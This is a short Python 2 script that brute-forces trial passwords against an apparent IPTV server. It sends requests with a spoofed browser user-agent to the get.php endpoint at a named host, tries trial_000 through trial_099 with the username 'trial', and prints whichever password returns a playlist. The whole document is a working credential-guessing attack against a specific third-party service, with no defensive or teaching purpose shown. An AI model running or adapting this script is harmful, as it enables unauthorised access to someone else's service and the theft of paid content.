import urllib2


def get_response(url):
    req = urllib2.Request(url)
    req.add_header('User-Agent',
                   'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3')
    response = urllib2.urlopen(req)
    responsestr = response.read()
    response.close()
    return responsestr


for num in range(0, 100):
    url = "http://tvdasogra.com:8880/get.php?username=trial&password=trial_" + str(num).zfill(
        3) + "&type=m3u&output=mpegts"
    link = get_response(url)
    if len(link) > 0:
        print "password->trial_" + str(num).zfill(3)
        # break
